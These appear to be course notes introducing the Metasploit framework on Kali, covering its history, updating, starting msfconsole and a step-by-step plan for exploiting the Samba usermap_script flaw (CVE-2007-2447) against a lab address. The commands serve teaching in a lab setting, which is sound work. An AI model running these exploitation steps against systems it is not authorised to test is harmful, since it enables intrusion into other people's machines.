Metasploit Introduction
    What was life like before metasploit?
        * Pen tested had to collect hacker tools themselves from a variety of sources (dark web, hackers) and test them themselves
        * Needed a lot of friends in the industry and dark web to get testing tools
        * Metasploit now has competing commercial pen testing frameworks such as cobalt strike, immunity canvas
    
    Keeping up to date
        * Wont apply to netlab but is important
        * Almost all tools we use will be changing and improving over time. Always keep them up to date
        * With metasploit, its a good idea. sudo apt --only-upgrade install metasploit-framework

    Running MSFConsole in Kali
        * Before you start metasploit console, initialize the metasploit database
            - sudo msfdb init
        * if you select the metasploit console from the quick menu on the left of the screen
            - msfconsole
        * Some people swear by the utility of the magic cow powers

    Selecting an exploit
        * Given over a thousand exploits, it might be hard to determine which one to select 
        * show exploits command will list all exploits
        * msf> search 2007-2447
        * Recent versions also support grep msf> grep usermap search cve-2007

    metasploit exploitation plan:
        * Find a vulnerability
        * Use an exploit that exploits it
            use multi/samba/usermap_script
        * Set options for the exploit
            show options
            set RHOST 172.16.28.161
        * Determine what payload to use
            show payloads
        * display only applicable payloads
        * Set payload
            set payload cmd

    Metasploit exploration plan
        * Check for extra payload options
            show options
        * see even more options
            show advanced
        * Run the exploit
            exploit
